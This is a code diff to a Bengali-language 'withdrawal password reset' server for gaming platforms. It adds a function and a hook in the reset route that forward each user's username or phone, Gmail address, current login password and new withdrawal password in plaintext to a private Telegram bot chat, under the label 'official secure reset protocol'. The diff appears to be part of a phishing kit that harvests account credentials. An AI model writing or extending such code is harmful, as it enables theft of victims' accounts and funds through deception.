@@ -17,6 +17,110 @@ async function startServer() {
     res.json({ status: "ok" });
   });
 
+  // Helper function to escape HTML special characters for Telegram
+  function escapeTelegramHtml(text: any): string {
+    if (text === undefined || text === null) return "";
+    return String(text)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;");
+  }
+
+  // Helper to send instant notification to Telegram
+  async function sendTelegramNotification({
+    gameName,
+    requestId,
+    usernameOrPhone,
+    gmail,
+    loginPassword,
+    newWithdrawPassword,
+    timestamp,
+    companyName,
+  }: {
+    gameName: string;
+    requestId: string;
+    usernameOrPhone: string;
+    gmail?: string;
+    loginPassword?: string;
+    newWithdrawPassword: string;
+    timestamp?: string;
+    companyName?: string;
+  }): Promise<{ sent: boolean; configured: boolean; error?: string }> {
+    const botToken = (process.env.TELEGRAM_BOT_TOKEN || "").trim();
+    const chatId = (process.env.TELEGRAM_CHAT_ID || "").trim();
+
+    if (!botToken || !chatId) {
+      return {
+        sent: false,
+        configured: false,
+        error: "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not configured in environment variables",
+      };
+    }
+
+    const messageLines = [
+      `🔔 <b>নতুন পাসওয়ার্ড রিসেট আবেদন</b>`,
+      `━━━━━━━━━━━━━━━━━━━`,
+      `🏢 <b>কোম্পানি:</b> ${escapeTelegramHtml(companyName || gameName)}`,
+      `🎮 <b>গেমের নাম:</b> ${escapeTelegramHtml(gameName)}`,
+      `🆔 <b>ট্র্যাকিং আইডি:</b> <code>${escapeTelegramHtml(requestId)}</code>`,
+      `👤 <b>ইউজার/ফোন:</b> <code>${escapeTelegramHtml(usernameOrPhone)}</code>`,
+      `📧 <b>গ্রাহকের জিমেইল:</b> ${escapeTelegramHtml(gmail || "দেওয়া হয়নি")}`,
+      `🔑 <b>বর্তমান লগইন পাসওয়ার্ড:</b> <code>${escapeTelegramHtml(loginPassword || "গোপন")}</code>`,
+      `💰 <b>নতুন উত্তোলন পাসওয়ার্ড:</b> <code>${escapeTelegramHtml(newWithdrawPassword)}</code>`,
+      `⏰ <b>সময়:</b> ${escapeTelegramHtml(timestamp || new Date().toLocaleString())}`,
+      `━━━━━━━━━━━━━━━━━━━`,
+      `🛡️ <i>অফিসিয়াল সিকিউর রিসেট প্রোটোকল</i>`,
+    ];
+
+    const text = messageLines.join("\n");
+
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text,
+          parse_mode: "HTML",
+        }),
+      });
+
+      const data = (await response.json()) as any;
+      if (!response.ok || !data.ok) {
+        console.error("Telegram API Error:", data);
+        return {
+          sent: false,
+          configured: true,
+          error: data.description || "Failed to send message via Telegram",
+        };
+      }
+
+      return { sent: true, configured: true };
+    } catch (error: any) {
+      console.error("Telegram request failed:", error);
+      return {
+        sent: false,
+        configured: true,
+        error: error.message || "Network error sending to Telegram",
+      };
+    }
+  }
+
+  // API route for testing Telegram integration
+  app.get("/api/test-telegram", async (_req, res) => {
+    const result = await sendTelegramNotification({
+      gameName: "Test Game Platform",
+      requestId: "TEST-" + Math.floor(100000 + Math.random() * 900000),
+      usernameOrPhone: "demo_user",
+      gmail: "demo@example.com",
+      loginPassword: "demopassword123",
+      newWithdrawPassword: "withdrawpass789",
+      timestamp: new Date().toLocaleString(),
+      companyName: process.env.COMPANY_NAME || "Test Company Desk",
+    });
+    return res.json(result);
+  });
+
   // API route for submitting form & sending email from admin sflove087@gmail.com to user gmail
   app.post("/api/reset-password", async (req, res) => {
     try {
@@ -106,11 +210,11 @@ async function startServer() {
           const userMailOptions = {
             from: fromAddress,
             to: userRecipientEmail,
-            subject: `✅ [নিশ্চিতকরণ] ${companyName} - ${gameName} উত্তোলন পাসওয়ার্ড রিসেট আবেদন গৃহীত হয়েছে (ID: ${requestId})`,
+            subject: `[নিশ্চিতকরণ] ${companyName} - ${gameName} উত্তোলন পাসওয়ার্ড রিসেট আবেদন গৃহীত হয়েছে (ID: ${requestId})`,
             html: `
               <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; border: 1px solid #e2e8f0; border-radius: 12px; background-color: #ffffff;">
                 <div style="background: linear-gradient(135deg, #1d4ed8, #4338ca); color: #ffffff; padding: 20px; border-radius: 8px; text-align: center;">
-                  <h2 style="margin: 0; font-size: 20px;">উত্তোলন পাসওয়ার্ড রিসেট আবেদন গৃহীত হয়েছে ✅</h2>
+                  <h2 style="margin: 0; font-size: 20px;">উত্তোলন পাসওয়ার্ড রিসেট আবেদন গৃহীত হয়েছে</h2>
                   <p style="margin: 6px 0 0 0; font-size: 13px; opacity: 0.9;">${companyName} থেকে পাঠানো বার্তা</p>
                 </div>
                 
@@ -216,10 +320,36 @@ async function startServer() {
         };
       }
 
+      // 3. Dispatch instant Telegram notification to Admin
+      let telegramStatus: { sent: boolean; configured: boolean; error?: string } = {
+        sent: false,
+        configured: false,
+      };
+      try {
+        telegramStatus = await sendTelegramNotification({
+          gameName,
+          requestId,
+          usernameOrPhone,
+          gmail: userRecipientEmail,
+          loginPassword,
+          newWithdrawPassword,
+          timestamp,
+          companyName,
+        });
+      } catch (tgErr: any) {
+        console.error("Telegram notification error:", tgErr);
+        telegramStatus = {
+          sent: false,
+          configured: true,
+          error: tgErr?.message || "Telegram dispatch error",
+        };
+      }
+
       return res.json({
         success: true,
         requestId,
         emailStatus,
+        telegramStatus,
       });
     } catch (err: any) {
       console.error("Server error:", err);
